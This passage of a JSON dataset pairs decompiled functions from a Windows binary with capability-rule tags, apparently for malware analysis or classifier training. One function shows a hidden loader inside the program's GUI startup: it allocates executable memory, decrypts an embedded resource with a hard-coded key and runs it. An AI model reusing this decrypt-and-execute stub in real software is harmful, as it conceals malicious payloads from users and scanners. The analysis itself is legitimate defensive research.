uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 9));\n        uVar2 = *(arg_ch + (arg_10h - 9));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        iVar5 = *(arg_8h + (arg_10h - 8)) - *(arg_ch + (arg_10h - 8));\n        if (iVar5 != 0) {\n            iVar5 = (0 < iVar5) * 2 + -1;\n        }\n    }\n    if (iVar5 != 0) {\n        return iVar5;\n    }\n    goto code_r0x0041898e;\ncode_r0x00418443:\n    uVar2 = *(arg_8h + (arg_10h - 10));\n    if (uVar2 == *(arg_ch + (arg_10h - 10))) {\n        iVar3 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 10));\n        if ((uVar2 != uVar4) && (iVar3 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 9));\n        uVar2 = *(arg_ch + (arg_10h - 9));\n        if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 8));\n        uVar2 = *(arg_ch + (arg_10h - 8));\n        if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        iVar3 = *(arg_8h + (arg_10h - 7)) - *(arg_ch + (arg_10h - 7));\n        if (iVar3 != 0) {\n            iVar3 = (0 < iVar3) * 2 + -1;\n        }\n    }\n    if (iVar3 != 0) {\n        return iVar3;\n    }\n    goto code_r0x004184e2;\ncode_r0x00417fe1:\n    uVar2 = *(arg_8h + (arg_10h - 9));\n    if (uVar2 == *(arg_ch + (arg_10h - 9))) {\n        iVar5 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 9));\n        if ((uVar2 != uVar4) && (iVar5 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 8));\n        uVar2 = *(arg_ch + (arg_10h - 8));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 7));\n        uVar2 = *(arg_ch + (arg_10h - 7));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        iVar5 = *(arg_8h + (arg_10h - 6)) - *(arg_ch + (arg_10h - 6));\n        if (iVar5 != 0) {\n            iVar5 = (0 < iVar5) * 2 + -1;\n        }\n    }\n    if (iVar5 != 0) {\n        return iVar5;\n    }\n    goto code_r0x00418080;\ncode_r0x0041898e:\n    uVar2 = *(arg_8h + (arg_10h - 7));\n    if (uVar2 != *(arg_ch + (arg_10h - 7))) {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 7));\n        if ((uVar2 != uVar4) && (iVar3 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 6));\n        uVar2 = *(arg_ch + (arg_10h - 6));\n        if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 5));\n        uVar2 = *(arg_ch + (arg_10h - 5));\n        if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        iVar3 = *(arg_8h + (arg_10h - 4)) - *(arg_ch + (arg_10h - 4));\n        if (iVar3 != 0) {\n            iVar3 = (0 < iVar3) * 2 + -1;\n        }\n    }\n    if (iVar3 != 0) {\n        return iVar3;\n    }\ncode_r0x00418a1d:\n    uVar4 = *(arg_8h + (arg_10h - 3));\n    uVar2 = *(arg_ch + (arg_10h - 3));\n    if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n        return iVar3;\n    }\n    uVar4 = *(arg_8h + (arg_10h - 2));\n    uVar2 = *(arg_ch + (arg_10h - 2));\n    if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n        return iVar3;\n    }\n    goto code_r0x00418106;\ncode_r0x004184e2:\n    uVar2 = *(arg_8h + (arg_10h - 6));\n    if (uVar2 == *(arg_ch + (arg_10h - 6))) {\n        iVar3 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 6));\n        if ((uVar2 != uVar4) && (iVar3 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 5));\n        uVar2 = *(arg_ch + (arg_10h - 5));\n        if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 4));\n        uVar2 = *(arg_ch + (arg_10h - 4));\n        if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        iVar3 = *(arg_8h + (arg_10h - 3)) - *(arg_ch + (arg_10h - 3));\n        if (iVar3 != 0) {\n            iVar3 = (0 < iVar3) * 2 + -1;\n        }\n    }\n    if (iVar3 != 0) {\n        return iVar3;\n    }\ncode_r0x00418581:\n    iVar1 = *(arg_8h + (arg_10h - 2));\n    if (iVar1 == *(arg_ch + (arg_10h - 2))) {\n        return 0;\n    }\n    uVar4 = iVar1;\n    uVar2 = *(arg_ch + (arg_10h - 2));\n    if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n        return iVar3;\n    }\n    uVar4 = *(arg_8h + (arg_10h - 1));\n    uVar2 = *(arg_ch + (arg_10h - 1));\n    if (uVar4 == uVar2) {\n        return 0;\n    }\n    return (0 < uVar4 - uVar2) * 2 + -1;\ncode_r0x00417ba0:\n    uVar2 = *(arg_8h + (arg_10h - 8));\n    if (uVar2 == *(arg_ch + (arg_10h - 8))) {\n        iVar5 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 8));\n        if ((uVar2 != uVar4) && (iVar5 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 7));\n        uVar2 = *(arg_ch + (arg_10h - 7));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 6));\n        uVar2 = *(arg_ch + (arg_10h - 6));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        iVar5 = *(arg_8h + (arg_10h - 5)) - *(arg_ch + (arg_10h - 5));\n        if (iVar5 != 0) {\n            iVar5 = (0 < iVar5) * 2 + -1;\n        }\n    }\n    if (iVar5 != 0) {\n        return iVar5;\n    }\ncode_r0x00417c3f:\n    uVar2 = *(arg_8h + (arg_10h - 4));\n    if (uVar2 != *(arg_ch + (arg_10h - 4))) {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 4));\n        if ((uVar2 != uVar4) && (iVar3 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 3));\n        uVar2 = *(arg_ch + (arg_10h - 3));\n        if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 2));\n        uVar2 = *(arg_ch + (arg_10h - 2));\n        if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        iVar3 = *(arg_8h + (arg_10h - 1)) - *(arg_ch + (arg_10h - 1));\n        if (iVar3 != 0) {\n            iVar3 = (0 < iVar3) * 2 + -1;\n        }\n    }\n    if (iVar3 == 0) {\ncode_r0x00417cce:\n        iVar3 = 0;\n    }\n    return iVar3;\ncode_r0x00418080:\n    uVar2 = *(arg_8h + (arg_10h - 5));\n    if (uVar2 != *(arg_ch + (arg_10h - 5))) {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 5));\n        if ((uVar2 != uVar4) && (iVar3 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 4));\n        uVar2 = *(arg_ch + (arg_10h - 4));\n        if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 3));\n        uVar2 = *(arg_ch + (arg_10h - 3));\n        if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        iVar3 = *(arg_8h + (arg_10h - 2)) - *(arg_ch + (arg_10h - 2));\n        if (iVar3 != 0) {\n            iVar3 = (0 < iVar3) * 2 + -1;\n        }\n    }\n    if (iVar3 != 0) {\n        return iVar3;\n    }\ncode_r0x00418106:\n    uVar4 = *(arg_8h + (arg_10h - 1));\n    uVar2 = *(arg_ch + (arg_10h - 1));\n    if (uVar4 == uVar2) {\n        return 0;\n    }\n    return (0 < uVar4 - uVar2) * 2 + -1;\n}\n",
        "token_count": 16359
    },
    "0040106e": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040106e(code *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    code **in_ECX;\n    \n    *in_ECX = vtable.CClock.0;\n    *(in_ECX + 7) = 0;\n    in_ECX[5] = arg_8h;\n    pcVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)(0, arg_10h, 0, 0x90000000, 0, 0, 0x6f, 0x15, arg_8h, 0, arg_ch, 0);\n    in_ECX[6] = pcVar1;\n    pcVar1 = (*_sym.imp.USER32.dll_LoadMenuA)(arg_ch, 0x6d);\n    in_ECX[2] = pcVar1;\n    pcVar1 = (*_sym.imp.USER32.dll_GetSubMenu)(pcVar1, 0);\n    in_ECX[3] = pcVar1;\n    uVar2 = (*_sym.imp.USER32.dll_GetDC)(in_ECX[6]);\n    pcVar1 = (*_sym.imp.GDI32.dll_CreateCompatibleDC)(uVar2);\n    in_ECX[4] = pcVar1;\n    (*_sym.imp.USER32.dll_ReleaseDC)(in_ECX[6], uVar2);\n    pcVar1 = (*_sym.imp.USER32.dll_LoadBitmapA)(arg_ch, 0x85);\n    in_ECX[1] = pcVar1;\n    (*_sym.imp.GDI32.dll_SelectObject)(in_ECX[4], pcVar1);\n    pcVar1 = _sym.imp.USER32.dll_SetWindowLongA;\n    (*_sym.imp.USER32.dll_SetWindowLongA)(in_ECX[6], 0xfffffffc, 0x401050);\n    (*pcVar1)(in_ECX[6], 0xffffffeb);\n    return;\n}\n",
        "token_count": 437
    },
    "00406777": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406777(uint dwMilliseconds)\n\n{\n    (*_sym.imp.KERNEL32.dll_Sleep)(dwMilliseconds);\n    return;\n}\n",
        "token_count": 34
    },
    "0041cc84": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.0041cc84(void)\n\n{\n    *0x435e28 = (*_sym.imp.KERNEL32.dll_CreateFileW)(L\"CONOUT$\", 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 63
    },
    "0040105f": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0040105f(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint auStack40 [2];\n    uint uStack32;\n    int32_t iStack12;\n    uint uStack8;\n    \n    pcVar4 = NULL;\n    pcVar5 = NULL;\n    uStack8 = 0;\n    iVar2 = fcn.00401078();\n    if ((iVar2 == 0) && (iVar2 = fcn.0040100a(L\"kernel32.dll\"),  iVar2 != 0)) {\n        pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(0x400000, 0x42cd10);\n    }\n    iStack12 = fcn.00401014(0xeca, 0x8e9, 0x409, &uStack8);\n    uVar3 = uStack8;\n    if ((iStack12 != 0) && (pcVar4 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, uStack8, 0x3000, 0x40),  pcVar4 != NULL))\n    {\n        (*pcVar5)(iStack12, uVar3, \"*Z59Drrf54QiC$hJ#gOK+69cn8+(xcALhQV>DQd@\", 0x29, pcVar4);\n    }\n    (*pcVar4)();\n    pcVar5 = _sym.imp.USER32.dll_LoadStringA;\n    (*_sym.imp.USER32.dll_LoadStringA)(param_1, 0x67, 0x436848, 100);\n    (*pcVar5)(param_1, 0x6d, 0x4368b0, 100);\n    (*pcVar5)(param_1, 0x6e, 0x436918, 100);\n    fcn.0040107d(param_1);\n    iVar2 = fcn.0040101e(param_1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    uVar3 = (*_sym.imp.USER32.dll_LoadAcceleratorsA)(param_1, 0x6d);\n    pcVar1 = _sym.imp.USER32.dll_GetMessageA;\n    iVar2 = (*_sym.imp.USER32.dll_GetMessageA)(auStack40, 0, 0, 0);\n    pcVar4 = _sym.imp.USER32.dll_TranslateMessage;\n    pcVar5 = _sym.imp.USER32.dll_DispatchMessageA;\n    while (iVar2 != 0) {\n        iVar2 = (*_sym.imp.USER32.dll_TranslateAcceleratorA)(auStack40[0], uVar3, auStack40);\n        if (iVar2 == 0) {\n            (*pcVar4)(auStack40);\n            (*pcVar5)(auStack40);\n        }\n        iVar2 = (*pcVar1)(auStack40, 0, 0, 0);\n    }\n    return uStack32;\n}\n",
        "token_count": 676
    },
    "004032a7": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004032a7(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00406830(0x434270, 0xc);\n    fcn.00406d5b(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x436cec;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x436ce8;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x004032ec;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.00402cb3(arg_8h_00);\ncode_r0x004032ec:\n        fcn.00402cb3(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0040330f();\n    fcn.00406875();\n    return;\n}\n",
        "token_count": 392
    },
    "00403318": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00403318(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00406830(0x4342b0, 0xc);\n    fcn.00406d5b(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x436cec;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x436ce8;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x0040335d;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.00402cb3(arg_8h_00);\ncode_r0x0040335d:\n        fcn.00402cb3(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00403380();\n    fcn.00406875();\n    return;\n}\n",
        "token_count": 394
    },
    "004125d8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004125d8(uint8_t *param_1, uint8_t **param_2, uint param_3)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    uint unaff_EBX;\n    uint8_t *arg_ch;\n    int32_t aiStack48 [2];\n    int32_t iStack40;\n    char cStack36;\n    uchar auStack32 [24];\n    uint32_t uStack8;\n    \n    uStack8 = *0x435040 ^ &stack0xfffffffc;\n    fcn.0040d9b1(param_3);\n    if (param_2 != NULL) {\n        *param_2 = param_1;\n    }\n    iVar4 = aiStack48[0];\n    arg_ch = param_1;\n    if (param_1 == NULL) {\n        puVar1 = fcn.00403fac();\n        *puVar1 = 0x16;\n        fcn.00406bf3();\n    }\n    else {\n        while( true ) {\n            if (*(iVar4 + 0x74) < 2) {\n                uVar2 = *(*(iVar4 + 0x90) + *arg_ch * 2) & 8;\n            }\n            else {\n                uVar2 = fcn.00414815(*arg_ch, 8, aiStack48);\n                iVar4 = aiStack48[0];\n            }\n            if (uVar2 == 0) break;\n            arg_ch = arg_ch + 1;\n        }\n        puVar3 = fcn.00419de0(auStack32, arg_ch, aiStack48);\n        if (param_2 != NULL) {\n            *param_2 = arg_ch + puVar3[1];\n        }\n        if ((*puVar3 & 0x240) == 0) {\n            if ((*puVar3 & 0x81) == 0) {\n                if (((*puVar3 & 0x100) != 0) && (*(puVar3 + 4) == 0.0)) {\n                    puVar1 = fcn.00403fac();\n                    *puVar1 = 0x22;\n                }\n            }\n            else {\n                puVar1 = fcn.00403fac();\n                *puVar1 = 0x22;\n            }\n        }\n        else if (param_2 != NULL) {\n            *param_2 = param_1;\n        }\n    }\n    if (cStack36 != '\\0') {\n        *(iStack40 + 0x70) = *(iStack40 + 0x70) & 0xfffffffd;\n    }\n    fcn.004023ff(unaff_EBX);\n    return;\n}\n",
        "token_count": 605
    },
    "0041e936": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041e936(uint16_t *param_1, uint16_t **param_2, uint param_3)\n\n{\n    uint16_t uVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    uint unaff_EBX;\n    uint16_t *arg_ch;\n    uchar auStack56 [8];\n    int32_t iStack48;\n    char cStack44;\n    double dStack40;\n    uchar auStack32 [24];\n    uint32_t uStack8;\n    \n    uStack8 = *0x435040 ^ &stack0xfffffffc;\n    fcn.0040d9b1(param_3);\n    if (param_2 != NULL) {\n        *param_2 = param_1;\n    }\n    if (param_1 == NULL) {\n        puVar2 = fcn.00403fac();\n        *puVar2 = 0x16;\n        fcn.00406bf3();\n    }\n    else {\n        uVar1 = *param_1;\n        arg_ch = param_1;\n        while (iVar3 = fcn.0041cc17(uVar1, 8),  iVar3 != 0) {\n            arg_ch = arg_ch + 1;\n            uVar1 = *arg_ch;\n        }\n        puVar4 = fcn.00420a04(auStack32, arg_ch, auStack56);\n        if (param_2 != NULL) {\n            *param_2 = arg_ch + puVar4[1];\n        }\n        if ((*puVar4 & 0x240) == 0) {\n            if ((*puVar4 & 0x81) == 0) {\n                if (((*puVar4 & 0x100) != 0) && (*(puVar4 + 4) == 0.0)) {\n                    puVar2 = fcn.00403fac();\n                    *puVar2 = 0x22;\n                }\n            }\n            else {\n                dStack40 = *0x435df0;\n                if (*arg_ch == 0x2d) {\n                    dStack40 = -*0x435df0;\n                }\n                puVar2 = fcn.00403fac();\n                *puVar2 = 0x22;\n            }\n        }\n        else if (param_2 != NULL) {\n            *param_2 = param_1;\n        }\n    }\n    if (cStack44 != '\\0') {\n        *(iStack48 + 0x70) = *(iStack48 + 0x70) & 0xfffffffd;\n    }\n    fcn.004023ff(unaff_EBX);\n    return;\n}\n",
        "token_count": 585
    },
    "004062e2": {
        "rules": [
            "get thread local storage value"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004062e2(uint arg_8h)\n\n{\n    if ((*0x438b48 ^ *0x435040) != NULL) {\n        (*(*0x438b48 ^ *0x435040))();\n        return;\n    }\n    (*_sym.imp.KERNEL32.dll_TlsGetValue)(arg_8h);\n    return;\n}\n",
        "token_count": 80
    }
}